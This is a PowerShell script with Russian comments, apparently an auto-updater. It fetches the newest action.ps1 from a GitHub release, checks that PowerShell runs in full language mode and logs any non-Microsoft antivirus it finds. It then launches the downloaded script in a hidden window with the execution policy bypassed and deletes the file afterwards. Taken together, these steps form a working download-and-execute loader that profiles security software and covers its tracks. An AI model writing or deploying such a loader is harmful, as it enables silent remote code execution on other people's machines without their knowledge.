& {
    # ===============================
    # ⚙️ Настройки
    # ===============================
    $USERNAME         = "sanblchsun"
    $REPO             = "up"
    $ASSET_NAME       = "action.ps1"
    $SCRIPT_DIR       = $PSScriptRoot
    $SCRIPT_ACTION    = Join-Path $SCRIPT_DIR "action"
    $VERSION_FILE     = [IO.Path]::Combine($SCRIPT_DIR, $SCRIPT_ACTION, "version.txt")
    $LOCAL_SCRIPT     = [IO.Path]::Combine($SCRIPT_DIR, $SCRIPT_ACTION, $ASSET_NAME)
    $TMP_FILE         = [IO.Path]::Combine($SCRIPT_DIR, $SCRIPT_ACTION, ".new")
    $LOG_FILE         = Join-Path $SCRIPT_DIR "get.my_script.log"

    $GITHUB_API_URL   = "https://api.github.com/repos/$USERNAME/$REPO/releases/latest"


    # ===============================
    # 🧾 Логирование
    # ===============================
    function Write-Log {
        param([string]$msg, [string]$level = "INFO")
        $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        "$ts [$level] $msg" | Out-File $LOG_FILE -Encoding UTF8 -Append
    }

    function Fail-Fatal {
        param([string]$msg)
        Write-Log $msg "FATAL"
        exit 1
    }


    # ===============================
    # 📂 Обеспечение директории
    # ===============================
    function Ensure-ScriptDir {
        if (-not (Test-Path $SCRIPT_ACTION)) {
            New-Item -ItemType Directory -Path $SCRIPT_ACTION -Force | Out-Null
            Write-Log "Создана директория: $SCRIPT_ACTION"
        }
    }


    # ===============================
    # 🔍 Получить локальную версию
    # ===============================
    function Get-LocalVersion {
        Write-Log "проверка директории: $VERSION_FILE"
        if (Test-Path $VERSION_FILE) {
            return (Get-Content $VERSION_FILE -Raw).Trim()
        }
        return $null
    }


    # ===============================
    # 💾 Сохранить версию
    # ===============================
    function Save-LocalVersion {
        param([string]$Version)
        $Version | Out-File $VERSION_FILE -Encoding UTF8
        Write-Log "Сохранена версия: $Version"
    }


    # ===============================
    # 🌐 Получить последнюю версию GitHub
    # ===============================
    function Get-LatestRelease {
        try {
            $r = Invoke-RestMethod -Uri $GITHUB_API_URL -UseBasicParsing -TimeoutSec 15
            $ver = $r.tag_name

            foreach ($asset in $r.assets) {
                if ($asset.name -eq $ASSET_NAME) {
                    return @{
                        Url     = $asset.browser_download_url
                        Version = $ver
                    }
                }
            }

            Write-Log "Файл $ASSET_NAME отсутствует в релизе"
            return $null
        }
        catch {
            Write-Log "Ошибка GitHub API: $($_.Exception.Message)"
            return $null
        }
    }


    # ===============================
    # ⚙️ Проверка системы
    # ===============================
    function Check-System {
        if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
            Write-Log "PowerShell не в FullLanguageMode"
            return $false
        }

        try { [void][System.Math]::Sqrt(4) }
        catch {
            Write-Log "Ошибка .NET: $($_.Exception.Message)"
            return $false
        }

        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
        return $true
    }


    # ===============================
    # 🛡️ Проверка сторонних антивирусов
    # ===============================
    function Check-3rdPartyAV {
        try {
            $cmd = if ($PSVersionTable.PSVersion.Major -ge 3) { 'Get-CimInstance' } else { 'Get-WmiObject' }
            $list = & $cmd -Namespace root\SecurityCenter2 -Class AntiVirusProduct |
                    Where-Object { $_.displayName -notlike "*windows*" } |
                    Select-Object -ExpandProperty displayName

            if ($list) {
                Write-Log "Сторонний антивирус: $($list -join ', ')"
            }
        }
        catch {
            Write-Log "Ошибка проверки антивируса: $($_.Exception.Message)"
        }
    }


    # ===============================
    # ⬇️ Скачать файл
    # ===============================
    function Download-File {
        param($Url, $Target)
        try {
            Invoke-WebRequest -Uri $Url -OutFile $Target -UseBasicParsing
            Write-Log "Скачано: $Target"
        }
        catch {
            Fail-Fatal "Ошибка загрузки: $($_.Exception.Message)"
        }
    }


    # ===============================
    # 🔄 Обновление action.ps1
    # ===============================
    function Update-Script {
        param([string]$Url, [string]$NewVersion)

        Download-File -Url $Url -Target $TMP_FILE

        if (Test-Path $LOCAL_SCRIPT) {
            Remove-Item $LOCAL_SCRIPT -Force
        }

        Move-Item $TMP_FILE $LOCAL_SCRIPT -Force
        Write-Log "Файл обновлён: $LOCAL_SCRIPT"

        Save-LocalVersion $NewVersion
    }


    # ===============================
    # ▶️ Запуск action.ps1 → удаление
    # ===============================
    function Run-Action {
        param([string]$ScriptPath)

        try {
            $proc = Start-Process powershell `
                -ArgumentList "-ExecutionPolicy Bypass -File `"$ScriptPath`"" `
                -WindowStyle Hidden `
                -PassThru

            Write-Log "action.ps1 запущен PID=$($proc.Id)"

            $proc.WaitForExit()

            if (Test-Path $ScriptPath) {
                Remove-Item $ScriptPath -Force
                Write-Log "action.ps1 удалён после выполнения"
            }
        }
        catch {
            Write-Log "Ошибка выполнения action.ps1: $($_.Exception.Message)"
        }
    }


    # ===============================
    # 🧠 MAIN
    # ===============================
    try {
        Ensure-ScriptDir
        Write-Log "строка 199"
        # 1️⃣ Проверяем наличие новой версии
        $release = Get-LatestRelease
        if (-not $release) {
            Fail-Fatal "GitHub не вернул релиз"
            exit 0
        }

        Write-Log "строка 207"
        $latestVersion = $release.Version
        $downloadUrl   = $release.Url
        Write-Log "строка 210"
        $localVersion  = Get-LocalVersion
        Write-Log "строка 212"

        if ($localVersion -and ($localVersion -eq $latestVersion)) {
            Write-Log "Уже актуальная версия: $localVersion"
            exit 0
        }
        Write-Log "строка 216"

        # 2️⃣ Проверка системы и AV
        if (-not (Check-System)) { Fail-Fatal "Система не проходит проверку" }
        Check-3rdPartyAV
        Write-Log "строка 221"

        Write-Log "Новая версия: $latestVersion (локальная: $localVersion)"

        # 3️⃣ Обновление
        Update-Script -Url $downloadUrl -NewVersion $latestVersion

        Write-Log "строка 228"
        # 4️⃣ Запуск action.ps1 + автоудаление
        Start-Sleep -Milliseconds 200
        Run-Action -ScriptPath $LOCAL_SCRIPT

        exit 0
    }
    catch {
        Fail-Fatal "Необработанная ошибка: $($_.Exception.Message)"
    }
}
